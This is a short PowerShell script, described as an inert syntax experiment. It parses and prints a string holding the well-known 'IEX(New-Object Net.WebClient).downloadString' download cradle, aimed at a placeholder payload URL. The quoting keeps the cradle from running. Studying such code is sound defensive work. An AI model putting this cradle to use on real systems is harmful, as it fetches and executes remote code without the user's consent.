<# An inert syntax experiment: no URL is contacted and no download expression is executed. #>
$ErrorActionPreference = 'Stop'
$taskLiteral = '"IEX(New-Object Net.WebClient).downloadString(''https://example.invalid/payload.txt'')"'
$taskTokens = $null
$taskParseErrors = $null
$taskAst = [System.Management.Automation.Language.Parser]::ParseInput($taskLiteral, [ref]$taskTokens, [ref]$taskParseErrors)
if ($taskParseErrors.Count -ne 0) { throw 'Literal experiment did not parse' }
$taskNodeTypes = $taskAst.FindAll({ param($node) $true }, $true) | ForEach-Object { $_.GetType().Name } | Select-Object -Unique
Write-Output 'Input is an inert double-quoted string with a reserved domain.'
Write-Output ('AST types: ' + ($taskNodeTypes -join ', '))
Write-Output ('Literal value: ' + [System.Management.Automation.ScriptBlock]::Create($taskLiteral).Invoke())
Write-Output 'The output alone does not verify the complete historical PowerShell session.'
